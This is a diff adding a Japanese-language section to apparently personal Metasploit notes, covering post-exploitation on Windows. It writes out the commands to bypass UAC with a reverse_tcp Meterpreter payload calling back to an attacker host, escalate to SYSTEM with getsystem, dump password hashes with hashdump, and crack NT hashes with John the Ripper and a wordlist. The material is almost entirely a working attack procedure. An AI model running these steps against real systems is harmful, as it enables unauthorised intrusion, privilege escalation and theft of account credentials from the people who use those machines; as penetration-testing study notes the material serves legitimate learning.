@@ -93,3 +93,35 @@ exploit
 # Meterpreterプロンプトで使用可能
 pwd, ls, cd
 ```
+
+### パスワードハッシュを入手する
+
+```bash
+# ユーザ名を確認
+getuid
+# 権限昇格のため、一旦meterpreterセッションをバックグラウンドへ
+background
+# UACバイパスモジュール
+use exploit/windows/local/bypassuac
+set SESSION [セッションNo]
+set payload windows/meterpreter/reverse_tcp
+set LHOST [ホストIP]
+exploit
+
+# ユーザ確認
+getuid
+# 権限昇格
+getsystem -t 1
+# ユーザ確認
+getuid
+# パスワードハッシュダンプ取得
+# ※現状は"ArgumentError wrong number of arguments"エラーとなっている
+run hashdump
+```
+
+### パスワード解析
+
+```bash
+john [パスワードファイルパス] --show
+john --wordlist=/usr/share/john/password.lst --format:nt .[パスワードファイルパス]
+```
